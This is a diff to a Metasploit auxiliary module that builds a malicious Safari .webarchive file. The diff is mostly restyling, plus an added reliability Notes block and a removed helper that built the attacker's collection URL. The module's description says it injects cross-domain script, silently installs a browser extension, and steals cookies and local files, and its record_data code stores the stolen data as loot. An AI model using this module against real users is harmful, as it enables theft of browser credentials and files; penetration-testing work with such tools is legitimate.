@@ -12,28 +12,36 @@ class MetasploitModule < Msf::Auxiliary
   include Msf::Auxiliary::Report
 
   def initialize(info = {})
-    super(update_info(info,
-      'Name'           => 'Mac OS X Safari .webarchive File Format UXSS',
-      'Description'    => %q{
-        Generates a .webarchive file for Mac OS X Safari that will attempt to
-        inject cross-domain Javascript (UXSS), silently install a browser
-        extension, collect user information, steal the cookie database,
-        and steal arbitrary local files.
+    super(
+      update_info(
+        info,
+        'Name' => 'Mac OS X Safari .webarchive File Format UXSS',
+        'Description' => %q{
+          Generates a .webarchive file for Mac OS X Safari that will attempt to
+          inject cross-domain Javascript (UXSS), silently install a browser
+          extension, collect user information, steal the cookie database,
+          and steal arbitrary local files.
 
-        When opened on the target machine the webarchive file must not have the
-        quarantine attribute set, as this forces the webarchive to execute in a
-        sandbox.
-      },
-      'License'        => MSF_LICENSE,
-      'Author'         => 'joev',
-      'References'     =>
-        [
+          When opened on the target machine the webarchive file must not have the
+          quarantine attribute set, as this forces the webarchive to execute in a
+          sandbox.
+        },
+        'License' => MSF_LICENSE,
+        'Author' => 'joev',
+        'References' => [
           ['URL', 'https://www.rapid7.com/blog/post/2013/04/25/abusing-safaris-webarchive-file-format/']
         ],
-      'DisclosureDate' => '2013-02-22',
-      'Actions'        => [[ 'WebServer', 'Description' => 'Serve exploit via web server' ]],
-      'PassiveActions' => [ 'WebServer' ],
-      'DefaultAction'  => 'WebServer'))
+        'DisclosureDate' => '2013-02-22',
+        'Actions' => [[ 'WebServer', 'Description' => 'Serve exploit via web server' ]],
+        'PassiveActions' => [ 'WebServer' ],
+        'DefaultAction' => 'WebServer',
+        'Notes' => {
+          'Reliability' => UNKNOWN_RELIABILITY,
+          'Stability' => UNKNOWN_STABILITY,
+          'SideEffects' => UNKNOWN_SIDE_EFFECTS
+        }
+      )
+    )
   end
 
   def run
@@ -71,19 +79,11 @@ class MetasploitModule < Msf::Auxiliary
   # @return [String] filename where we are storing the data
   def record_data(data, cli)
     if data.is_a? Hash
-      file = File.basename(data.keys.first).gsub(/[^A-Za-z]/,'')
+      file = File.basename(data.keys.first).gsub(/[^A-Za-z]/, '')
     end
     store_loot(
       file || "data", "text/plain", cli.peerhost, data, "safari_webarchive", "Webarchive Collected Data"
     )
-  end
-
-  # @return [String] formatted http/https URL of the listener
-  def backend_url
-    proto = (datastore["SSL"] ? "https" : "http")
-    myhost = (datastore['SRVHOST'] == '0.0.0.0') ? Rex::Socket.source_address : datastore['SRVHOST']
-    port_str = (datastore['SRVPORT'].to_i == 80) ? '' : ":#{datastore['SRVPORT']}"
-    "#{proto}://#{myhost}#{port_str}/#{datastore['URIPATH']}/catch"
   end
 
   def message
@@ -99,6 +99,5 @@ class MetasploitModule < Msf::Auxiliary
       |
     end
   end
-
 
 end
